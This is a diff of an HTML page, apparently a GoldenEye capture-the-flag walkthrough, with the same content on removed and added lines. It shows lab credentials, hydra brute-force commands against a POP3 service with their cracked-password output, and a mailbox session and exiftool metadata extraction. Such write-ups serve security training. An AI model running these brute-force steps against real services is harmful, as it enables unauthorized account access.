+</span><span id="__span-18-39"><a id="__codelineno-18-39" name="__codelineno-18-39"></a><span class="s1">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span>
+</span><span id="__span-18-40"><a id="__codelineno-18-40" name="__codelineno-18-40"></a><span class="s1">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span>
+</span><span id="__span-18-41"><a id="__codelineno-18-41" name="__codelineno-18-41"></a><span class="s1">From: root@ubuntu</span>
+</span><span id="__span-18-42"><a id="__codelineno-18-42" name="__codelineno-18-42"></a>
+</span><span id="__span-18-43"><a id="__codelineno-18-43" name="__codelineno-18-43"></a><span class="s1">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#39;</span>s<span class="w"> </span>related<span class="w"> </span>to<span class="w"> </span>security...even<span class="w"> </span><span class="k">if</span><span class="w"> </span>it<span class="s1">&#39;s not, just enter it in under the guise of &quot;security&quot;...it&#39;</span>ll<span class="w"> </span>get<span class="w"> </span>the<span class="w"> </span>change<span class="w"> </span>order<span class="w"> </span>escalated<span class="w"> </span>without<span class="w"> </span>much<span class="w"> </span>hassle<span class="w"> </span>:<span class="o">)</span>
+</span><span id="__span-18-44"><a id="__codelineno-18-44" name="__codelineno-18-44"></a>
+</span><span id="__span-18-45"><a id="__codelineno-18-45" name="__codelineno-18-45"></a>Ok,<span class="w"> </span>user<span class="w"> </span>creds<span class="w"> </span>are:
+</span><span id="__span-18-46"><a id="__codelineno-18-46" name="__codelineno-18-46"></a>
+</span><span id="__span-18-47"><a id="__codelineno-18-47" name="__codelineno-18-47"></a>username:<span class="w"> </span>xenia
+</span><span id="__span-18-48"><a id="__codelineno-18-48" name="__codelineno-18-48"></a>password:<span class="w"> </span>RCP90rulez!
+</span><span id="__span-18-49"><a id="__codelineno-18-49" name="__codelineno-18-49"></a>
+</span><span id="__span-18-50"><a id="__codelineno-18-50" name="__codelineno-18-50"></a>Boris<span class="w"> </span>verified<span class="w"> </span>her<span class="w"> </span>as<span class="w"> </span>a<span class="w"> </span>valid<span class="w"> </span>contractor<span class="w"> </span>so<span class="w"> </span>just<span class="w"> </span>create<span class="w"> </span>the<span class="w"> </span>account<span class="w"> </span>ok?
+</span><span id="__span-18-51"><a id="__codelineno-18-51" name="__codelineno-18-51"></a>
+</span><span id="__span-18-52"><a id="__codelineno-18-52" name="__codelineno-18-52"></a>And<span class="w"> </span><span class="k">if</span><span class="w"> </span>you<span class="w"> </span>didn<span class="s1">&#39;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span>
+</span><span id="__span-18-53"><a id="__codelineno-18-53" name="__codelineno-18-53"></a><span class="s1">**Make sure to edit your host file since you usually work remote off-network....</span>
+</span><span id="__span-18-54"><a id="__codelineno-18-54" name="__codelineno-18-54"></a>
+</span><span id="__span-18-55"><a id="__codelineno-18-55" name="__codelineno-18-55"></a><span class="s1">Since you&#39;</span>re<span class="w"> </span>a<span class="w"> </span>Linux<span class="w"> </span>user<span class="w"> </span>just<span class="w"> </span>point<span class="w"> </span>this<span class="w"> </span>servers<span class="w"> </span>IP<span class="w"> </span>to<span class="w"> </span>severnaya-station.com<span class="w"> </span><span class="k">in</span><span class="w"> </span>/etc/hosts.
+</span><span id="__span-18-56"><a id="__codelineno-18-56" name="__codelineno-18-56"></a>.
+</span></code></pre></div></td></tr></table></div>
 <h3 id="exploitation">Exploitation</h3>
 <p>Somehow, without really being aware of it, we have already entered into an Exploitation phase. In this phase, our findings will take us further so eventually we will be gaining access to the system.</p>
 <h4 id="first-use-credentials-to-access-the-webservice"><strong>First</strong>, use credentials to access the webservice</h4>
@@ -17751,70 +17987,113 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <li>password: RCP90rulez!</li>
 </ul>
 <p>And we also have the instruction to add this line to our /etc/hosts file:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># We open the /etc/hosts file and add this line at the end</span>
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="m">192</span>.168.56.101<span class="w">  </span>severnaya-station.com/gnocertdir<span class="w"> </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span>
+<span class="normal"><a href="#__codelineno-19-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a><span class="c1"># We open the /etc/hosts file and add this line at the end</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a><span class="m">192</span>.168.56.101<span class="w">  </span>severnaya-station.com/gnocertdir<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
 <p>Now, in our browser we can go to that address and we can confirm that we have a moodle cms. We can login using the credentials for the user xenia. </p>
 <h4 id="second-gather-information-and-try-to-exploit-it"><strong>Second</strong>, gather information and try to exploit it</h4>
 <p>Browsing around we can retrieve the name of twot other users:</p>
 <p><img alt="User: admin" src="../img/goldeneye1-1.png" />
 <img alt="User: doak" src="../img/goldeneye1-2.png" /></p>
 <p>With these two new users in mind we can use hydra again to try to brute force them. Run in two separate tabs:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>hydra<span class="w"> </span>-l<span class="w"> </span>doak<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/fasttrack.txt<span class="w"> </span><span class="m">192</span>.168.56.101<span class="w"> </span>-s55007<span class="w"> </span>pop3
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/fasttrack.txt<span class="w"> </span><span class="m">192</span>.168.56.101<span class="w"> </span>-s55007<span class="w"> </span>pop3<span class="w"> </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span>
+<span class="normal"><a href="#__codelineno-20-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a>hydra<span class="w"> </span>-l<span class="w"> </span>doak<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/fasttrack.txt<span class="w"> </span><span class="m">192</span>.168.56.101<span class="w"> </span>-s55007<span class="w"> </span>pop3
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/fasttrack.txt<span class="w"> </span><span class="m">192</span>.168.56.101<span class="w"> </span>-s55007<span class="w"> </span>pop3<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
 <p>And we obtain results only for the username doak:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
-</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-19 12:07:05
-</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
-</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>[DATA] attacking pop3://192.168.56.101:55007/
-</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
-</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
-</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>[55007][pop3] host: 192.168.56.101   login: doak   password: goat
-</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>1 of 1 target successfully completed, 1 valid password found
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-21-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-21-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-21-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-21-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-21-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-21-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-21-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-21-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-21-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2"></a>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3"></a>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-19 12:07:05
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4"></a>[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5"></a>[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6"></a>[DATA] attacking pop3://192.168.56.101:55007/
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7"></a>[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8"></a>[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9"></a>[55007][pop3] host: 192.168.56.101   login: doak   password: goat
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10"></a>1 of 1 target successfully completed, 1 valid password found
+</span></code></pre></div></td></tr></table></div>
 <h4 id="third-login-into-dovecot-using-the-credentials-found"><strong>Third</strong>, login into dovecot using the credentials found</h4>
 <ul>
 <li>user: doak</li>
 <li>password: goat</li>
 </ul>
 <p>And now, let's read the messages:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>Trying 192.168.56.101...
-</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>Connected to 192.168.56.101.
-</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>Escape character is &#39;^]&#39;.
-</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>+OK GoldenEye POP3 Electronic-Mail System
-</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>user doak
-</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>+OK
-</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>pass goat
-</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>+OK Logged in.
-</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>list
-</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a>+OK 1 messages:
-</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a>1 606
-</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a>.
-</span><span id="__span-22-13"><a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a>retr 1
-</span><span id="__span-22-14"><a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a>+OK 606 octets
-</span><span id="__span-22-15"><a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a>Return-Path: &lt;doak@ubuntu&gt;
-</span><span id="__span-22-16"><a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a>X-Original-To: doak
-</span><span id="__span-22-17"><a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a>Delivered-To: doak@ubuntu
-</span><span id="__span-22-18"><a id="__codelineno-22-18" name="__codelineno-22-18" href="#__codelineno-22-18"></a>Received: from doak (localhost [127.0.0.1])
-</span><span id="__span-22-19"><a id="__codelineno-22-19" name="__codelineno-22-19" href="#__codelineno-22-19"></a>        by ubuntu (Postfix) with SMTP id 97DC24549D
-</span><span id="__span-22-20"><a id="__codelineno-22-20" name="__codelineno-22-20" href="#__codelineno-22-20"></a>        for &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
-</span><span id="__span-22-21"><a id="__codelineno-22-21" name="__codelineno-22-21" href="#__codelineno-22-21"></a>Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;
-</span><span id="__span-22-22"><a id="__codelineno-22-22" name="__codelineno-22-22" href="#__codelineno-22-22"></a>Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
-</span><span id="__span-22-23"><a id="__codelineno-22-23" name="__codelineno-22-23" href="#__codelineno-22-23"></a>From: doak@ubuntu
-</span><span id="__span-22-24"><a id="__codelineno-22-24" name="__codelineno-22-24" href="#__codelineno-22-24"></a>
-</span><span id="__span-22-25"><a id="__codelineno-22-25" name="__codelineno-22-25" href="#__codelineno-22-25"></a>James,
-</span><span id="__span-22-26"><a id="__codelineno-22-26" name="__codelineno-22-26" href="#__codelineno-22-26"></a>If you&#39;re reading this, congrats you&#39;ve gotten this far. You know how tradecraft works right?
-</span><span id="__span-22-27"><a id="__codelineno-22-27" name="__codelineno-22-27" href="#__codelineno-22-27"></a>
-</span><span id="__span-22-28"><a id="__codelineno-22-28" name="__codelineno-22-28" href="#__codelineno-22-28"></a>Because I don&#39;t. Go to our training site and login to my account....dig until you can exfiltrate further information......
-</span><span id="__span-22-29"><a id="__codelineno-22-29" name="__codelineno-22-29" href="#__codelineno-22-29"></a>
-</span><span id="__span-22-30"><a id="__codelineno-22-30" name="__codelineno-22-30" href="#__codelineno-22-30"></a>username: dr_doak
-</span><span id="__span-22-31"><a id="__codelineno-22-31" name="__codelineno-22-31" href="#__codelineno-22-31"></a>password: 4England!
-</span><span id="__span-22-32"><a id="__codelineno-22-32" name="__codelineno-22-32" href="#__codelineno-22-32"></a>
-</span><span id="__span-22-33"><a id="__codelineno-22-33" name="__codelineno-22-33" href="#__codelineno-22-33"></a>.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-22-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-22-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-22-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-22-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-22-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-22-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-22-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-22-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-22-10">10</a></span>
+<span class="normal"><a href="#__codelineno-22-11">11</a></span>
+<span class="normal"><a href="#__codelineno-22-12">12</a></span>
+<span class="normal"><a href="#__codelineno-22-13">13</a></span>
+<span class="normal"><a href="#__codelineno-22-14">14</a></span>
+<span class="normal"><a href="#__codelineno-22-15">15</a></span>
+<span class="normal"><a href="#__codelineno-22-16">16</a></span>
+<span class="normal"><a href="#__codelineno-22-17">17</a></span>
+<span class="normal"><a href="#__codelineno-22-18">18</a></span>
+<span class="normal"><a href="#__codelineno-22-19">19</a></span>
+<span class="normal"><a href="#__codelineno-22-20">20</a></span>
+<span class="normal"><a href="#__codelineno-22-21">21</a></span>
+<span class="normal"><a href="#__codelineno-22-22">22</a></span>
+<span class="normal"><a href="#__codelineno-22-23">23</a></span>
+<span class="normal"><a href="#__codelineno-22-24">24</a></span>
+<span class="normal"><a href="#__codelineno-22-25">25</a></span>
+<span class="normal"><a href="#__codelineno-22-26">26</a></span>
+<span class="normal"><a href="#__codelineno-22-27">27</a></span>
+<span class="normal"><a href="#__codelineno-22-28">28</a></span>
+<span class="normal"><a href="#__codelineno-22-29">29</a></span>
+<span class="normal"><a href="#__codelineno-22-30">30</a></span>
+<span class="normal"><a href="#__codelineno-22-31">31</a></span>
+<span class="normal"><a href="#__codelineno-22-32">32</a></span>
+<span class="normal"><a href="#__codelineno-22-33">33</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a>Trying 192.168.56.101...
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2"></a>Connected to 192.168.56.101.
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3"></a>Escape character is &#39;^]&#39;.
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4"></a>+OK GoldenEye POP3 Electronic-Mail System
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5"></a>user doak
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6"></a>+OK
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7"></a>pass goat
+</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8"></a>+OK Logged in.
+</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9"></a>list
+</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10"></a>+OK 1 messages:
+</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11"></a>1 606
+</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12"></a>.
+</span><span id="__span-22-13"><a id="__codelineno-22-13" name="__codelineno-22-13"></a>retr 1
+</span><span id="__span-22-14"><a id="__codelineno-22-14" name="__codelineno-22-14"></a>+OK 606 octets
+</span><span id="__span-22-15"><a id="__codelineno-22-15" name="__codelineno-22-15"></a>Return-Path: &lt;doak@ubuntu&gt;
+</span><span id="__span-22-16"><a id="__codelineno-22-16" name="__codelineno-22-16"></a>X-Original-To: doak
+</span><span id="__span-22-17"><a id="__codelineno-22-17" name="__codelineno-22-17"></a>Delivered-To: doak@ubuntu
+</span><span id="__span-22-18"><a id="__codelineno-22-18" name="__codelineno-22-18"></a>Received: from doak (localhost [127.0.0.1])
+</span><span id="__span-22-19"><a id="__codelineno-22-19" name="__codelineno-22-19"></a>        by ubuntu (Postfix) with SMTP id 97DC24549D
+</span><span id="__span-22-20"><a id="__codelineno-22-20" name="__codelineno-22-20"></a>        for &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+</span><span id="__span-22-21"><a id="__codelineno-22-21" name="__codelineno-22-21"></a>Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;
+</span><span id="__span-22-22"><a id="__codelineno-22-22" name="__codelineno-22-22"></a>Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+</span><span id="__span-22-23"><a id="__codelineno-22-23" name="__codelineno-22-23"></a>From: doak@ubuntu
+</span><span id="__span-22-24"><a id="__codelineno-22-24" name="__codelineno-22-24"></a>
+</span><span id="__span-22-25"><a id="__codelineno-22-25" name="__codelineno-22-25"></a>James,
+</span><span id="__span-22-26"><a id="__codelineno-22-26" name="__codelineno-22-26"></a>If you&#39;re reading this, congrats you&#39;ve gotten this far. You know how tradecraft works right?
+</span><span id="__span-22-27"><a id="__codelineno-22-27" name="__codelineno-22-27"></a>
+</span><span id="__span-22-28"><a id="__codelineno-22-28" name="__codelineno-22-28"></a>Because I don&#39;t. Go to our training site and login to my account....dig until you can exfiltrate further information......
+</span><span id="__span-22-29"><a id="__codelineno-22-29" name="__codelineno-22-29"></a>
+</span><span id="__span-22-30"><a id="__codelineno-22-30" name="__codelineno-22-30"></a>username: dr_doak
+</span><span id="__span-22-31"><a id="__codelineno-22-31" name="__codelineno-22-31"></a>password: 4England!
+</span><span id="__span-22-32"><a id="__codelineno-22-32" name="__codelineno-22-32"></a>
+</span><span id="__span-22-33"><a id="__codelineno-22-33" name="__codelineno-22-33"></a>.
+</span></code></pre></div></td></tr></table></div>
 <h4 id="fourth-log-into-moodle-with-new-credentials-and-browse-the-service"><strong>Fourth</strong>, Log into moodle with new credentials and browse the service</h4>
 <p>As we have disclosed, again, a new credential for the moodle site, let's login and see what we can find: </p>
 <ul>
@@ -17827,43 +18106,75 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>An image in a secret location is shared with us. Let's download it from http://severnaya-station.com/dir007key/for-007.jpg</p>
 <p><img alt="theimage" src="../img/goldeneye1-4.png" /></p>
 <p>Aparently this image has nothing juicy, but if we look their metadata with exiftool, then... magic happens:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>exiftool<span class="w"> </span><span class="k">for</span>-007.jpg<span class="w"> </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a>exiftool<span class="w"> </span><span class="k">for</span>-007.jpg<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>ExifTool Version Number         : 12.49
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>File Name                       : for-007.jpg
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>Directory                       : Downloads
-</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>File Size                       : 15 kB
-</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>File Modification Date/Time     : 2023:01:19 12:37:35-05:00
-</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>File Access Date/Time           : 2023:01:19 12:37:35-05:00
-</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>File Inode Change Date/Time     : 2023:01:19 12:37:35-05:00
-</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>File Permissions                : -rw-r--r--
-</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>File Type                       : JPEG
-</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>File Type Extension             : jpg
-</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>MIME Type                       : image/jpeg
-</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>JFIF Version                    : 1.01
-</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>X Resolution                    : 300
-</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>Y Resolution                    : 300
-</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a>Exif Byte Order                 : Big-endian (Motorola, MM)
-</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a>Image Description               : eFdpbnRlcjE5OTV4IQ==
-</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a>Make                            : GoldenEye
-</span><span id="__span-24-18"><a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a>Resolution Unit                 : inches
-</span><span id="__span-24-19"><a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a>Software                        : linux
-</span><span id="__span-24-20"><a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a>Artist                          : For James
-</span><span id="__span-24-21"><a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a>Y Cb Cr Positioning             : Centered
-</span><span id="__span-24-22"><a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a>Exif Version                    : 0231
-</span><span id="__span-24-23"><a id="__codelineno-24-23" name="__codelineno-24-23" href="#__codelineno-24-23"></a>Components Configuration        : Y, Cb, Cr, -
-</span><span id="__span-24-24"><a id="__codelineno-24-24" name="__codelineno-24-24" href="#__codelineno-24-24"></a>User Comment                    : For 007
-</span><span id="__span-24-25"><a id="__codelineno-24-25" name="__codelineno-24-25" href="#__codelineno-24-25"></a>Flashpix Version                : 0100
-</span><span id="__span-24-26"><a id="__codelineno-24-26" name="__codelineno-24-26" href="#__codelineno-24-26"></a>Image Width                     : 313
-</span><span id="__span-24-27"><a id="__codelineno-24-27" name="__codelineno-24-27" href="#__codelineno-24-27"></a>Image Height                    : 212
-</span><span id="__span-24-28"><a id="__codelineno-24-28" name="__codelineno-24-28" href="#__codelineno-24-28"></a>Encoding Process                : Baseline DCT, Huffman coding
-</span><span id="__span-24-29"><a id="__codelineno-24-29" name="__codelineno-24-29" href="#__codelineno-24-29"></a>Bits Per Sample                 : 8
-</span><span id="__span-24-30"><a id="__codelineno-24-30" name="__codelineno-24-30" href="#__codelineno-24-30"></a>Color Components                : 3
-</span><span id="__span-24-31"><a id="__codelineno-24-31" name="__codelineno-24-31" href="#__codelineno-24-31"></a>Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
-</span><span id="__span-24-32"><a id="__codelineno-24-32" name="__codelineno-24-32" href="#__codelineno-24-32"></a>Image Size                      : 313x212
-</span><span id="__span-24-33"><a id="__codelineno-24-33" name="__codelineno-24-33" href="#__codelineno-24-33"></a>Megapixels                      : 0.066
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-24-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-24-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-24-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-24-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-24-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-24-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-24-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-24-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-24-10">10</a></span>
+<span class="normal"><a href="#__codelineno-24-11">11</a></span>
+<span class="normal"><a href="#__codelineno-24-12">12</a></span>
+<span class="normal"><a href="#__codelineno-24-13">13</a></span>
+<span class="normal"><a href="#__codelineno-24-14">14</a></span>
+<span class="normal"><a href="#__codelineno-24-15">15</a></span>
+<span class="normal"><a href="#__codelineno-24-16">16</a></span>
+<span class="normal"><a href="#__codelineno-24-17">17</a></span>
+<span class="normal"><a href="#__codelineno-24-18">18</a></span>
+<span class="normal"><a href="#__codelineno-24-19">19</a></span>
+<span class="normal"><a href="#__codelineno-24-20">20</a></span>
+<span class="normal"><a href="#__codelineno-24-21">21</a></span>
+<span class="normal"><a href="#__codelineno-24-22">22</a></span>
+<span class="normal"><a href="#__codelineno-24-23">23</a></span>
